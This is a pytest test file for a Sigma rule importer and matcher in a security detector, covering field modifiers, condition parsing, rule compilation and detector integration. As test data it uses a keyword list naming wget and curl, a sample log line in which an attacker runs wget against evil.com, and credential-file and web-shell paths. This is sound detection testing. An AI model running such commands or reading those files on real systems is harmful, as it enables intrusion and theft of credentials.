"""
tests/test_sigma.py -- Sigma rule import and matching (cnsl/sigma.py).

Run:
    pytest tests/test_sigma.py -v
"""

from __future__ import annotations

import os
import tempfile
from dataclasses import dataclass, field
from typing import Any, Dict, Optional
from unittest.mock import AsyncMock, MagicMock

import pytest
import yaml

from cnsl.sigma import (
    SigmaImportError,
    SigmaRule,
    SigmaRuleStore,
    compile_rule,
)
from cnsl.detector import Detector

from helpers import make_cfg, _run


#  Fake event -- mirrors cnsl.models.Event's public shape


@dataclass
class FakeEvent:
    ts:     float = 0.0
    source: str = "test"
    kind:   str = "SSH_FAIL"
    src_ip: Optional[str] = None
    dst_ip: Optional[str] = None
    user:   Optional[str] = None
    raw:    Optional[str] = None
    meta:   Dict[str, Any] = field(default_factory=dict)


def _rule(detection: Dict[str, Any], **doc_overrides) -> SigmaRule:
    doc = {"title": "test rule", "level": "medium", "detection": detection}
    doc.update(doc_overrides)
    return compile_rule(doc, source_path="<test>")


#  Field / selection matching


class TestFieldMatching:
    def test_plain_equality_match(self):
        r = _rule({"sel": {"user": "root"}, "condition": "sel"})
        assert r.matches(FakeEvent(user="root"))
        assert not r.matches(FakeEvent(user="alice"))

    def test_equality_is_case_insensitive_by_default(self):
        r = _rule({"sel": {"user": "Root"}, "condition": "sel"})
        assert r.matches(FakeEvent(user="root"))

    def test_cased_modifier_enforces_case_sensitivity(self):
        r = _rule({"sel": {"user|cased": "Root"}, "condition": "sel"})
        assert r.matches(FakeEvent(user="Root"))
        assert not r.matches(FakeEvent(user="root"))

    def test_contains_modifier(self):
        r = _rule({"sel": {"path|contains": "passwd"}, "condition": "sel"})
        assert r.matches(FakeEvent(meta={"path": "/etc/passwd"}))
        assert not r.matches(FakeEvent(meta={"path": "/etc/shadow"}))

    def test_startswith_modifier(self):
        r = _rule({"sel": {"path|startswith": "/etc/"}, "condition": "sel"})
        assert r.matches(FakeEvent(meta={"path": "/etc/passwd"}))
        assert not r.matches(FakeEvent(meta={"path": "/var/etc/passwd"}))

    def test_endswith_modifier(self):
        r = _rule({"sel": {"path|endswith": ".php"}, "condition": "sel"})
        assert r.matches(FakeEvent(meta={"path": "/shell.php"}))
        assert not r.matches(FakeEvent(meta={"path": "/shell.php.bak"}))

    def test_re_modifier(self):
        r = _rule({"sel": {"path|re": r"\.(php|asp)$"}, "condition": "sel"})
        assert r.matches(FakeEvent(meta={"path": "/x.php"}))
        assert r.matches(FakeEvent(meta={"path": "/x.asp"}))
        assert not r.matches(FakeEvent(meta={"path": "/x.html"}))

    def test_list_value_is_or(self):
        r = _rule({"sel": {"user": ["root", "admin"]}, "condition": "sel"})
        assert r.matches(FakeEvent(user="root"))
        assert r.matches(FakeEvent(user="admin"))
        assert not r.matches(FakeEvent(user="bob"))

    def test_all_modifier_requires_every_value(self):
        r = _rule({"sel": {"path|contains|all": ["etc", "passwd"]}, "condition": "sel"})
        assert r.matches(FakeEvent(meta={"path": "/etc/passwd"}))
        assert not r.matches(FakeEvent(meta={"path": "/etc/shadow"}))

    def test_null_value_requires_field_absent(self):
        r = _rule({"sel": {"user": None}, "condition": "sel"})
        assert r.matches(FakeEvent(user=None))
        assert not r.matches(FakeEvent(user="root"))

    def test_selection_map_is_and_of_fields(self):
        r = _rule({"sel": {"user": "root", "kind": "SSH_FAIL"}, "condition": "sel"})
        assert r.matches(FakeEvent(user="root", kind="SSH_FAIL"))
        assert not r.matches(FakeEvent(user="root", kind="SSH_SUCCESS"))

    def test_selection_list_of_maps_is_or(self):
        r = _rule({
            "sel": [{"user": "root"}, {"user": "admin"}],
            "condition": "sel",
        })
        assert r.matches(FakeEvent(user="root"))
        assert r.matches(FakeEvent(user="admin"))
        assert not r.matches(FakeEvent(user="bob"))

    def test_selection_keyword_list_searches_raw_text(self):
        r = _rule({"sel": ["wget", "curl"], "condition": "sel"})
        assert r.matches(FakeEvent(raw="attacker ran wget http://evil.com/x"))
        assert not r.matches(FakeEvent(raw="nothing interesting here"))

    def test_missing_field_falls_back_to_raw_substring(self):
        # "custom_field" is in neither the alias table nor meta -- should
        # fall back to a plain substring search over ev.raw.
        r = _rule({"sel": {"custom_field": "needle"}, "condition": "sel"})
        assert r.matches(FakeEvent(raw="haystack needle haystack"))
        assert not r.matches(FakeEvent(raw="haystack only"))

    @pytest.mark.parametrize("alias,attr", [
        ("SourceIp", "src_ip"), ("src_ip", "src_ip"), ("ip", "src_ip"),
        ("DestinationIp", "dst_ip"),
        ("TargetUserName", "user"), ("User", "user"), ("account", "user"),
        ("EventKind", "kind"), ("kind", "kind"),
    ])
    def test_field_aliases_resolve_to_event_attributes(self, alias, attr):
        r = _rule({"sel": {alias: "MATCHVAL"}, "condition": "sel"})
        ev = FakeEvent(**{attr: "MATCHVAL"})
        assert r.matches(ev)


#  Condition mini-language


class TestConditionParser:
    def test_and(self):
        r = _rule({"a": {"user": "x"}, "b": {"kind": "SSH_FAIL"}, "condition": "a and b"})
        assert r.matches(FakeEvent(user="x", kind="SSH_FAIL"))
        assert not r.matches(FakeEvent(user="x", kind="SSH_SUCCESS"))

    def test_or(self):
        r = _rule({"a": {"user": "x"}, "b": {"user": "y"}, "condition": "a or b"})
        assert r.matches(FakeEvent(user="x"))
        assert r.matches(FakeEvent(user="y"))
        assert not r.matches(FakeEvent(user="z"))

    def test_not(self):
        r = _rule({"a": {"user": "x"}, "condition": "not a"})
        assert r.matches(FakeEvent(user="y"))
        assert not r.matches(FakeEvent(user="x"))

    def test_parentheses_change_precedence(self):
        # (a or b) and c
        r = _rule({
            "a": {"user": "x"}, "b": {"user": "y"}, "c": {"kind": "SSH_FAIL"},
            "condition": "(a or b) and c",
        })
        assert r.matches(FakeEvent(user="x", kind="SSH_FAIL"))
        assert r.matches(FakeEvent(user="y", kind="SSH_FAIL"))
        assert not r.matches(FakeEvent(user="x", kind="SSH_SUCCESS"))
        assert not r.matches(FakeEvent(user="z", kind="SSH_FAIL"))

    def test_n_of_wildcard(self):
        r = _rule({
            "sel_a": {"user": "x"}, "sel_b": {"user": "y"}, "sel_c": {"user": "z"},
            "condition": "1 of sel_*",
        })
        assert r.matches(FakeEvent(user="x"))
        assert r.matches(FakeEvent(user="z"))
        assert not r.matches(FakeEvent(user="q"))

    def test_all_of_wildcard(self):
        r = _rule({
            "sel_a": {"user": "x"}, "sel_b": {"kind": "SSH_FAIL"},
            "condition": "all of sel_*",
        })
        assert r.matches(FakeEvent(user="x", kind="SSH_FAIL"))
        assert not r.matches(FakeEvent(user="x", kind="SSH_SUCCESS"))

    def test_all_of_them(self):
        r = _rule({
            "sel_a": {"user": "x"}, "sel_b": {"kind": "SSH_FAIL"},
            "condition": "all of them",
        })
        assert r.matches(FakeEvent(user="x", kind="SSH_FAIL"))
        assert not r.matches(FakeEvent(user="x", kind="SSH_SUCCESS"))

    def test_1_of_them(self):
        r = _rule({
            "sel_a": {"user": "x"}, "sel_b": {"user": "y"},
            "condition": "1 of them",
        })
        assert r.matches(FakeEvent(user="x"))
        assert not r.matches(FakeEvent(user="z"))

    def test_unknown_selection_reference_rejected_at_compile_time(self):
        with pytest.raises(SigmaImportError):
            _rule({"a": {"user": "x"}, "condition": "a and b"})

    def test_malformed_condition_syntax_rejected(self):
        with pytest.raises(SigmaImportError):
            _rule({"a": {"user": "x"}, "condition": "a and"})

    def test_unmatched_paren_rejected(self):
        with pytest.raises(SigmaImportError):
            _rule({"a": {"user": "x"}, "condition": "(a"})


#  Rule compilation


class TestCompileRule:
    def test_valid_minimal_rule_compiles(self):
        r = _rule({"sel": {"user": "root"}, "condition": "sel"})
        assert r.severity == "MEDIUM"
        assert r.enabled is True

    def test_missing_detection_block_rejected(self):
        with pytest.raises(SigmaImportError):
            compile_rule({"title": "x"}, "<test>")

    def test_missing_condition_rejected(self):
        with pytest.raises(SigmaImportError):
            compile_rule({"title": "x", "detection": {"sel": {"user": "root"}}}, "<test>")

    def test_empty_selections_rejected(self):
        with pytest.raises(SigmaImportError):
            compile_rule({"title": "x", "detection": {"condition": "sel"}}, "<test>")

    def test_correlation_rule_rejected(self):
        with pytest.raises(SigmaImportError, match="correlation"):
            compile_rule({"title": "x", "correlation": {"type": "event_count"}}, "<test>")

    def test_unsupported_modifier_rejected(self):
        with pytest.raises(SigmaImportError, match="unsupported modifier"):
            compile_rule({
                "title": "x",
                "detection": {"sel": {"field|base64": "x"}, "condition": "sel"},
            }, "<test>")

    @pytest.mark.parametrize("level,expected", [
        ("informational", "LOW"), ("low", "LOW"),
        ("medium", "MEDIUM"),
        ("high", "HIGH"), ("critical", "HIGH"),
        ("unknown_level", "MEDIUM"),  # unrecognized level defaults to MEDIUM
    ])
    def test_level_mapped_to_severity(self, level, expected):
        r = _rule({"sel": {"user": "root"}, "condition": "sel"}, level=level)
        assert r.severity == expected

    def test_metadata_carried_through(self):
        r = _rule(
            {"sel": {"user": "root"}, "condition": "sel"},
            id="abc-123", title="My Rule", description="desc here",
            tags=["attack.t1110"], falsepositives=["admin activity"],
            references=["https://example.com"],
        )
        assert r.id == "abc-123"
        assert r.title == "My Rule"
        assert r.description == "desc here"
        assert r.tags == ["attack.t1110"]
        assert r.falsepositives == ["admin activity"]
        assert r.references == ["https://example.com"]

    def test_id_falls_back_to_title_then_filename(self):
        r = compile_rule({
            "title": "Fallback Title",
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }, source_path="/rules/some_file.yml")
        assert r.id == "Fallback Title"

        r2 = compile_rule({
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }, source_path="/rules/some_file.yml")
        assert r2.id == "some_file"


#  SigmaRuleStore


class TestSigmaRuleStore:
    def test_import_text_success(self):
        store = SigmaRuleStore()
        doc = {"title": "t", "level": "high",
               "detection": {"sel": {"user": "root"}, "condition": "sel"}}
        rule = store.import_text(yaml.dump(doc), label="inline")
        assert rule is not None
        assert len(store) == 1
        assert store.get(rule.id) is rule

    def test_import_text_bad_yaml_recorded_as_error(self):
        store = SigmaRuleStore()
        result = store.import_text("not: valid: yaml: [", label="bad")
        assert result is None
        errors = store.import_errors()
        assert len(errors) == 1
        assert errors[0]["path"] == "bad"

    def test_import_text_invalid_rule_recorded_as_error(self):
        store = SigmaRuleStore()
        result = store.import_text(yaml.dump({"title": "no detection"}), label="bad2")
        assert result is None
        assert len(store.import_errors()) == 1

    def test_import_dir_imports_valid_and_skips_invalid(self):
        with tempfile.TemporaryDirectory() as d:
            good = {"title": "good", "level": "high",
                    "detection": {"sel": {"user": "root"}, "condition": "sel"}}
            with open(os.path.join(d, "good.yml"), "w") as f:
                yaml.dump(good, f)
            with open(os.path.join(d, "bad.yml"), "w") as f:
                f.write("title: bad\n")  # no detection block

            store = SigmaRuleStore()
            result = store.import_dir(d)
            assert result == {"imported": 1, "failed": 1}
            assert len(store) == 1
            assert len(store.import_errors()) == 1

    def test_import_dir_nonexistent_directory(self):
        store = SigmaRuleStore()
        result = store.import_dir("/nonexistent/path/xyz")
        assert result == {"imported": 0, "failed": 0}
        assert len(store.import_errors()) == 1

    def test_enable_disable(self):
        store = SigmaRuleStore()
        doc = {"title": "t", "detection": {"sel": {"user": "root"}, "condition": "sel"}}
        rule = store.import_text(yaml.dump(doc), label="x")
        assert rule.enabled is True

        err = store.disable(rule.id)
        assert err is None
        assert store.get(rule.id).enabled is False
        assert not store.get(rule.id).matches(FakeEvent(user="root"))

        err = store.enable(rule.id)
        assert err is None
        assert store.get(rule.id).enabled is True

    def test_enable_disable_unknown_rule(self):
        store = SigmaRuleStore()
        assert store.enable("nope") is not None
        assert store.disable("nope") is not None

    def test_all_rules_sorted_by_id(self):
        store = SigmaRuleStore()
        for rid in ("zzz", "aaa", "mmm"):
            store.import_text(yaml.dump({
                "id": rid, "title": rid,
                "detection": {"sel": {"user": "x"}, "condition": "sel"},
            }), label=rid)
        ids = [r["id"] for r in store.all_rules()]
        assert ids == sorted(ids)

    def test_evaluate_returns_only_matching_enabled_rules(self):
        store = SigmaRuleStore()
        store.import_text(yaml.dump({
            "id": "r1", "title": "r1",
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }), label="r1")
        store.import_text(yaml.dump({
            "id": "r2", "title": "r2",
            "detection": {"sel": {"user": "someone_else"}, "condition": "sel"},
        }), label="r2")

        matches = store.evaluate(FakeEvent(user="root"))
        assert [r.id for r in matches] == ["r1"]

    def test_disabled_rule_never_matches_via_store(self):
        store = SigmaRuleStore()
        rule = store.import_text(yaml.dump({
            "id": "r1", "title": "r1",
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }), label="r1")
        store.disable(rule.id)
        assert store.evaluate(FakeEvent(user="root")) == []


#  Detector integration


def _make_detector_with_sigma(sigma_store):
    cfg = make_cfg()
    logger = AsyncMock()
    logger.log = AsyncMock()
    blocker = AsyncMock()
    blocker.is_blocked = MagicMock(return_value=False)
    blocker.block_ip = AsyncMock(return_value=True)
    return Detector(cfg, logger, blocker, sigma=sigma_store)


class TestDetectorIntegration:
    def test_sigma_match_fires_an_incident(self):
        from cnsl.models import Event, EventKind

        store = SigmaRuleStore()
        store.import_text(yaml.dump({
            "id": "r1", "title": "Root SSH attempt", "level": "high",
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }), label="r1")

        det = _make_detector_with_sigma(store)
        ev = Event(ts=1000.0, source="auth", kind=EventKind.SSH_FAIL,
                    src_ip="9.9.9.9", user="root", raw="test")
        _run(det.handle(ev))

        det.store = None  # no store configured in this test detector
        det.logger.log.assert_any_call("sigma_match", {
            "ip": "9.9.9.9", "rule_id": "r1", "title": "Root SSH attempt",
            "severity": "HIGH", "tags": [],
        })

    def test_sigma_disabled_via_rule_engine_skips_matching(self):
        from cnsl.models import Event, EventKind

        store = SigmaRuleStore()
        store.import_text(yaml.dump({
            "id": "r1", "title": "Root SSH attempt", "level": "high",
            "detection": {"sel": {"user": "root"}, "condition": "sel"},
        }), label="r1")

        det = _make_detector_with_sigma(store)
        det.rules.disable("sigma.match")

        ev = Event(ts=1000.0, source="auth", kind=EventKind.SSH_FAIL,
                    src_ip="9.9.9.9", user="root", raw="test")
        _run(det.handle(ev))

        calls = [c for c in det.logger.log.call_args_list if c.args[0] == "sigma_match"]
        assert calls == []

    def test_no_sigma_store_is_a_noop(self):
        from cnsl.models import Event, EventKind

        det = _make_detector_with_sigma(None)
        ev = Event(ts=1000.0, source="auth", kind=EventKind.SSH_FAIL,
                    src_ip="9.9.9.9", user="root", raw="test")
        # Must not raise even though self.sigma is None.
        _run(det.handle(ev))

    def test_empty_sigma_store_is_a_noop(self):
        from cnsl.models import Event, EventKind

        det = _make_detector_with_sigma(SigmaRuleStore())
        ev = Event(ts=1000.0, source="auth", kind=EventKind.SSH_FAIL,
                    src_ip="9.9.9.9", user="root", raw="test")
        _run(det.handle(ev))
        calls = [c for c in det.logger.log.call_args_list if c.args[0] == "sigma_match"]
        assert calls == []